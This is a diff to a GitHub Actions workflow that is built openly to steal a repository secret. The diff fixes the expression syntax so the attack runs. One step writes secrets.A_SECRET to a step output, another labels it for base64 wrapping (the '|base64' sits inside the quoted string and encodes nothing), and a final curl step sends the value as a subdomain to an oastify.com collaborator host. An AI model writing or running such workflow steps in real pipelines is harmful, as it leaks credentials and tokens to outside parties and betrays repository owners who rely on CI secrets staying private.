@@ -22,15 +22,15 @@ jobs:
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
       - name: Run a one-line script
-        id: "exfil"
+        id: "dumpsecret"
         run: |
          echo "exfilsecret=${{secrets.A_SECRET}}" >> $GITHUB_OUTPUT
 
       - name: Base64 wrap and print to action log
         id: exfil2
         run: |
-          echo  "eureka=[${{steps.exfil.outputs.exfilsecret}}]|base64" >> $GITHUB_OUTPUT
+          echo "eureka=[${{steps.dumpsecret.outputs.exfilsecret}}]|base64" >> $GITHUB_OUTPUT
           
       - name: exfil b64 encoded secret
         run: |
-          curl -v http://${steps.exfil2.outputs.eureka}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
+          curl -v http://${{steps.exfil2.outputs.eureka}}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
